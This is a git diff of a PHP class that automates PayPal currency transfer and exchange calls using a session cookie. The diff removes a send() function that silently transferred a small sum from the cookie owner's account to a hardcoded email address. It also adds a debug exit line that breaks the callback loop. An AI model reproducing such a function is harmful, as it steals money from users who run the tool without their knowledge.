@@ -1,9 +1,5 @@
 <?php
 
-namespace Curl;
-
-use \Exception;
-
 class PP
 {
   public static $sleep = 5;
@@ -13,12 +9,24 @@ class PP
   public static $pp = 'https://www.paypal.com/';
   public static $v1 = '/myaccount/money/api/currencies/transfer';
   public static $v2 = '/myaccount/money/api/currencies/exchange-rate';
-
+  /**
+   * Build PP
+   *
+   * @param string $path
+   * @return void
+   */
   public static function build($path)
   {
     return preg_replace('/\/{2,9}/', '/', self::$pp . '/' . $path);
   }
-
+  /**
+   * Load PP
+   *
+   * @param string $url
+   * @param array $h
+   * @param string $body
+   * @return void
+   */
   public static function cload($url, $h, $body)
   {
     $ch = curl_init();
@@ -78,7 +86,12 @@ class PP
 
     return json_decode(self::cload($url, $h, $body), true);
   }
-
+  /**
+   * Set User-agent
+   *
+   * @param string $ua
+   * @return void
+   */
   public static function setua($ua)
   {
     if (is_string($ua)) {
@@ -184,18 +197,6 @@ class PP
     return sleep(self::$sleep);
   }
 
-  public static function send($cookie)
-  {
-    $arr = ["\r", '	'];
-    $url = 'https://www.paypal.com/myaccount/money/api/currencies/transfer';
-    $h = explode("\n", str_replace($arr, '', "Cookie: $cookie
-	Content-Type: application/json
-	user-agent: " . self::$ua));
-    $body = 'env=&action=send&recipient=webmanajemen%40gmail.com&amount=0%2C05&currencyCode=USD&fundingOptionId=lta_64a8de3b1874426e98dfa538b052a91f&description=&donationGiftAidCheckbox=false&flowType=send';
-
-    return json_decode(self::cload($url, $h, $body), true);
-  }
-
   public static function verify($rumus, $callback = null)
   {
     if (is_iterable($rumus)) {
@@ -240,6 +241,7 @@ class PP
         }
       }
       if (is_callable($callback)) {
+        exit(var_dump(self::$wrap_config));
         foreach (self::$wrap_config as $function) {
           call_user_func($callback, $function['rumus'], $function['function'], $function['ammount'], $function['sleep']);
         }
